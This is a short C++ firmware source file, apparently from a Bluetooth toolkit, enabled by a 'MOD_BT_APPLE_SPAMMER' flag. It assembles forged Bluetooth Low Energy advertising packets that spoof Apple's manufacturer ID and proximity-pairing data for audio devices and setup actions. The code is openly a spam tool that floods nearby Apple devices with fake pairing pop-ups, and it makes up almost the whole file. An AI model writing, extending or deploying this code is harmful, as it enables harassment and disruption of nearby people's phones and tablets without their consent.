#include "bt.hpp"

#ifdef MOD_BT_APPLE_SPAMMER
	#include <cstring>

	BLEAdvertising* pAdv = nullptr;

	#define AUD(n,i) {n, i, AT_AUD},
	#define SET(n,i) {n, i, AT_SET},
	const ApplDev applDevs[] = { MOD_BT_APPLE_DEVS(AUD, SET) };
	#undef AUD
	#undef SET
	const int applN = sizeof(applDevs) / sizeof(applDevs[0]);

	void applPacket(const ApplDev& d, uint8_t* buf, size_t& len) {
		memset(buf, 0, 31);
		if (d.type == AT_AUD) {
			len = 31;
			uint8_t h[] = {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07};
			uint8_t b[] = {0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12};
			memcpy(buf, h, 7);buf[7] = d.id;memcpy(buf+8, b, 11);
		} else {
			len = 23;
			uint8_t p[] = {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1};
			uint8_t s[] = {0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00};
			memcpy(buf, p, 13);buf[13] = d.id;memcpy(buf+14, s, 9);
		}
	}
#endif
